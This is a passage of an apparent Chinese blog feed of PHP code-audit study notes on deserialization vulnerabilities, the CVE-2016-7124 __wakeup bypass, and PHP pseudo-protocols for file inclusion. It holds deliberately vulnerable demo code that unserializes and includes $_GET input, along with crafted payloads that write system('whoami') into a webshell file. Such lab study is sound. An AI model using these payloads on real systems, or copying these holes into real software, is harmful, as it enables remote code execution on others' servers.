<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="variable">$b</span>=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">    <span class="variable">$c</span>=<span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> (strlen(<span class="variable">$a</span>)-strlen(<span class="variable">$b</span>)+strlen(<span class="number">1</span>));&#125;</span><br><span class="line">phpinfo();&#123;</span><br><span class="line">    ((<span class="number">1</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025164600761.png" alt="image-20211025164600761"></p>
<h3 id="PHP反序列化学习"><a href="#PHP反序列化学习" class="headerlink" title="PHP反序列化学习"></a>PHP反序列化学习</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>php程序为了保存和转储对象，提供了序列化的方法。php序列化是为了在程序运行的过程中对对象进行转储而产生的。<code>序列化可以将对象转换成字符串，但仅保留对象里的成员变量，不保存函数方法</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php序列化的函数为serialize 可以将对象中的成员变量转换成字符串。</span><br><span class="line">php反序列化的函数为unserialize  可以将序列化生成的字符串重新还原为对象中的成员变量。</span><br></pre></td></tr></table></figure>

<p><code>将用户可控的数据进行反序列化</code> 就是所谓的php反序列化漏洞</p>
<h5 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h5><p>序列化的目的是方便数据的传输与储存。</p>
<p>php应用中，序列化和反序列化一般用做缓存，比如session缓存，cookie缓存等。</p>
<p>常见的序列化格式：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">二进制格式</span><br><span class="line">字节数组</span><br><span class="line">json字符串</span><br><span class="line">xml字符串</span><br></pre></td></tr></table></figure>

<p>序列化测试demo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;This is A&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="string">&quot;This is B&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;This is C&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is test1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> test();</span><br><span class="line">var_dump(serialize(<span class="variable">$test</span>));</span><br></pre></td></tr></table></figure>

<p>输出值:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">D:\phpstudy_pro\WWW\phplearn\global.php:<span class="number">11</span>:string &#x27;O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is A&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;�*�b&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is B&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;�test�c&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is C&quot;</span>;&#125;&#x27; (length=<span class="number">96</span>)</span><br></pre></td></tr></table></figure>

<p>实际上的序列化字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is A&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;�*�b&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is B&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;�test�c&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;This is C&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>序列化字符串结构</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:对象名的长度:<span class="string">&quot;对象名&quot;</span>:对象属性个数:&#123;s[属性的类型，字符串s 整型i....]:属性名的长度:<span class="string">&quot;属性名&quot;</span>;s:属性值的长度:<span class="string">&quot;属性值&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出来，序列化后，共有3个属性在序列化字符串中，函数方法test1未能进行序列化</p>
<p>序列化后的结果是字符串string</p>
<p>test是一个类，new test()代表创建test类的对象</p>
<p>O表示对象，4表示类名共有4个字符长 ，test是类的名称</p>
<p>3是序列化对象中共有三个成员变量。括号內部依序是<code>类型、名称、值</code>,同时变量与变量之间由分号隔开</p>
<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025174739757.png" alt="image-20211025174739757"></p>
<p>在这其中，a是public类型变量、s表示字符串、1表示变量名长度，a是变量名。</p>
<p>b是protected类型的变量，它的变量名长度为4，也就是在名字前加上了%00*%00变为了<code>%00*%00b</code> ,所以我们可以得知protected属性的表示方法是在变量名前加上<code>%00*%00</code></p>
<p>c是private类型的变量，c的变量名前加上类%00类名%00变量名 即<code>%00类%00c</code>表名此是私有变量</p>
<p>虽说在test类中存在test1方法，但php序列化中，并不会保存方法。</p>
<h5 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&#x27;This is A&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$b</span> = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$c</span> = <span class="string">&quot;This is C&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;this is test1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> test();</span><br><span class="line">var_dump(<span class="variable">$e</span> = serialize(<span class="variable">$test</span>)); <span class="comment">//打印输出序列化字符串</span></span><br><span class="line"></span><br><span class="line">var_dump(unserialize(<span class="variable">$e</span>)); <span class="comment">//反序列化字符串</span></span><br></pre></td></tr></table></figure>

<p>打印输出:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">object</span>(test)<span class="comment">#2 (3) &#123;</span></span><br><span class="line">  [<span class="string">&quot;a&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;This is A&quot;</span></span><br><span class="line">  [<span class="string">&quot;b&quot;</span>:<span class="keyword">protected</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  [<span class="string">&quot;c&quot;</span>:<span class="string">&quot;test&quot;</span>:<span class="keyword">private</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;This is C&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，类的成员变量被还原，它们是否公有、私有、保护的类型也得到正确的表示。</p>
<h5 id="在php中所能用到的魔术方法"><a href="#在php中所能用到的魔术方法" class="headerlink" title="在php中所能用到的魔术方法"></a>在php中所能用到的魔术方法</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php类可能会包含魔术方法，魔术方法命名都是以`__`开始，例如 `__construct`，`__destruct`,`__toString`,`__sleep`,`__wakeup`，魔法函数在某些情况下会自动调用</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">__construct(): 有构造函数的类会在每次创建新对象时先调用此方法。</span><br><span class="line">__destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line">__toString():一个类被当成字符串时应该如何回应，例如echo $obj打印类时，若存在__toString魔法函数，将会自动调用.</span><br><span class="line">__sleep(): 在一个对象被序列化之前调用</span><br><span class="line">__wakeup():unserialize()会检查是否存在一个_wakeup()方法。如果存在，则会首先调用__wakeup方法，为对象进行处理。</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">__construct() #当对象被创建时调用</span><br><span class="line">__destruct() #当对象被销毁时调用</span><br><span class="line">__toString() #当对象被当做字符串时使用</span><br><span class="line">__sleep() #在对象被序列化之前调用</span><br><span class="line">__wakeup() #在对象unserialize()之前进行调用</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;construct run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;destruct run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;toString run&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;str&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;sleep run&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;wakeup run&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//类被实现时，php首先检测类中是否存在__construct方法，存在先执行其魔术方法再实现</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;new了一个对象，对象被创建，执行__construct&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> Test();</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化之前检查类中是否存在__sleep()</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;serialize了一个对象，对象被序列化，先执行__sleep，再序列化&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$sTest</span> = serialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//__wakeup()在反序列化之间执行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;__wakeup():unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$usTest</span> = unserialize(<span class="variable">$sTest</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//当对象被当做字符串使用时，__toString方法被触发，执行其中内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;把Test对象当做字符串使用，执行__toString&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;use Test obj as str &#x27;</span>.<span class="variable">$test</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//程序执行完毕，对象销毁释放，执行__destruct方法.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;程序执行完毕，对象自动销毁，执行__destruct&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025195535420.png" alt="image-20211025195535420"></p>
<h5 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h5><p>攻击者可以操纵unserialize的参数，以构造恶意的序列化字符串，当应用程序将恶意字符串反序列化为对象后，恶意代码得以执行，这就造成了php反序列化漏洞。</p>
<p>demo:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$target</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;target = <span class="string">&#x27;wakeup!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\phplearn\\webshell.php&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        fputs(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;target);</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;destruct complate&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> A);</span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$test_unseria</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;webshell.php&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;.\webshell.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>利用echo ，拿到序列化后的恶意字符串，通过test传参进入</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;&#125;</span><br><span class="line">?test=O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025201208619.png" alt="image-20211025201208619"></p>
<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025201203470.png" alt="image-20211025201203470"></p>
<h4 id="实例展示"><a href="#实例展示" class="headerlink" title="实例展示"></a>实例展示</h4><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><p>构造序列化字符串时，可以根据要进行序列化操作的类中的成员变量，写一份简易序列化函数，用于调试payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$target</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>

<p>运行拿到序列化字符串:</p>
<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025210307399.png" alt="image-20211025210307399"></p>
<p>由于成员变量为protected模式，由此可知乱码为:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00*%00target&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>修改成员变量数目，绕过__wakeup()魔法函数，修改变量值长度与内容，添加恶意代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> O:1:&quot;A&quot;:1：&#123;s:9:&quot;%00*%00target&quot;;s:26:&quot;&lt;?php system(&#x27;whoami&#x27;); ?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025210652227.png" alt="image-20211025210652227"></p>
<h4 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h4><p>影响版本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP5 &lt; <span class="number">5.6</span>.<span class="number">25</span></span><br><span class="line">PHP7 &lt; <span class="number">7.0</span>.<span class="number">10</span></span><br></pre></td></tr></table></figure>

<p>当序列化对象进行反序列化时，如果表示对象属性个数的值大于真实的属性个数时，就会跳过_wakeup()的执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$target</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;target = <span class="string">&quot;wakeup!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\phplearn\\webshell.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fputs(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;target);</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$test_unseria</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;webshell.php&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;.\webshell.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>查看此处代码可看出，当我们对类A进行反序列处理时，无论在$test处确立的target值为多少，unserialize()的前一刻都会触发A的__wakeup魔术方法，将序列化字符串中的target值处理为<code>wakeup</code>,最后调用析构函数____destruct()执行内部代码，将target值写入到文件之中，然后在php文件的结尾包含webshell.php之中进行执行。</p>
<p>此处存在一处漏洞点，定义的序列化字符串属性个数大于真实的字符串属性个数时，__wakeup()魔法函数将不会生效:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">源:O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;&#125;</span><br><span class="line">改:O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;&#125;</span><br><span class="line">在序列化字符串中，只修改成员变量的值无效，还需修改其长度为对应长度大小。</span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025204112483.png" alt="image-20211025204112483"></p>
<p>若类中成员变量为protected  、 private类型，</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$target</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;target = <span class="string">&quot;wakeup!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\phplearn\\webshell.php&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        fputs(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;target);</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$test_unseria</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;webshell.php&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;.\webshell.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php序列化字符串在相应成员函数处如下所示</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> 类型:在变量名前加上%<span class="number">00</span>*%<span class="number">00</span></span><br><span class="line">?file=O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00*%00target&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&lt;?php system(&#x27;whoami&#x27;);?&gt;&quot;</span>;&#125;</span><br><span class="line"><span class="keyword">private</span>类型:%<span class="number">00</span>类名%<span class="number">00</span>变量名</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00A%00target&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&lt;?php system(&#x27;whoami&#x27;);?&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025205746814.png" alt="image-20211025205746814"></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>php代码审计学习(2)</title>
    <url>/2021/10/24/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2/</url>
    <content><![CDATA[<h3 id="PHP伪协议学习"><a href="#PHP伪协议学习" class="headerlink" title="PHP伪协议学习"></a>PHP伪协议学习</h3><p>参考自 <a href="https://segmentfault.com/a/1190000018991087">PHP伪协议总结</a>、 <a href="https://segmentfault.com/a/1190000018991087">php伪协议实现命令执行的七种姿势</a>两篇文章进行复现学习。</p>
<h4 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a>file:// 协议</h4><ul>
<li><strong>条件</strong></li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_fopen:off/on </span><br><span class="line">allow_url_include:off/on</span><br><span class="line"><span class="comment">#翻译一下就是file://协议的使用，不受这两个属性的开关的影响</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>作用</strong></li>
</ul>
<span id="more"></span>

<p>用于访问本地文件系统，在CTF中常用于<strong>读取本地文件</strong>且不受allow_url_fopen与allow_url_include的开关影响</p>
<p>include()、require()、require_once()、include_once() 参数可控的情况下，如导入非php文件，则仍会按照php的语法进行解析。</p>
<ul>
<li>include()、include_once()下：这是由于包含的文件放到了<?php ?>之内，代码执行到包含处依旧被会视为php文件内容，出错只会产生警报，而不会停止运行。</li>
<li>require()、require_once()下:是由于包含文件与原php文件拼接形成一个新的php文件，之后按照新php文件顺序进行执行。</li>
</ul>
<p><strong>说明：</strong></p>
<p>file:// 文件是PHP使用的默认封装协议，可用于读取本地文件。当指定一个相对路径作为读取目录，其相对时基于当前工作目录的。在很多情况下时脚本所在的目录，除非被修改过。当使用CLI时某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path </code>会可选地搜索，也作为相对的路径。</p>
<p><strong>用法：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/path/to/file.ext</span><br><span class="line">relative/path/to/file.ext</span><br><span class="line">fileInCwd.ext</span><br><span class="line">C:/path/to/winfile.ext</span><br><span class="line">C:\path\to\winfile.ext</span><br><span class="line">\\smbserver\share\path\to\winfile.ext</span><br><span class="line">file:<span class="comment">///path/to/file.ext</span></span><br></pre></td></tr></table></figure>

<p>举例展示：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=http://127.0.0.1/phplearn/phpinfo.txt</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=./phpinfo.txt</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/phplearn/global.php?file=file://D:\phpstudy_pro\WWW\phplearn\phpinfo.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2.assets/image-20211024195900350.png" alt="image-20211024195900350"></p>
<h4 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a>php:// 协议</h4><ul>
<li>条件：</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">allow_url_fopen: off/on</span><br><span class="line">allow_url_include: 仅当php:<span class="comment">//input、php://memory、php://temp时需要on</span></span><br></pre></td></tr></table></figure>

<ul>
<li>作用：</li>
</ul>
<p><code>php:// </code>访问各个输入/输出流 。我们经常使用到的是<code>php://filter</code> 和<code>php://input</code> 用于<strong>读取源码</strong> ，php://input用于<strong>执行php代码</strong></p>
<ul>
<li>说明</li>
</ul>
<table>
<thead>
<tr>
<th>协议</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>php://input</td>
<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input </code>是无效的。</td>
</tr>
<tr>
<td>php://output</td>
<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
</tr>
<tr>
<td>php://fd</td>
<td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
</tr>
<tr>
<td>php://memory php://temp</td>
<td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
</tr>
<tr>
<td>php://filter</td>
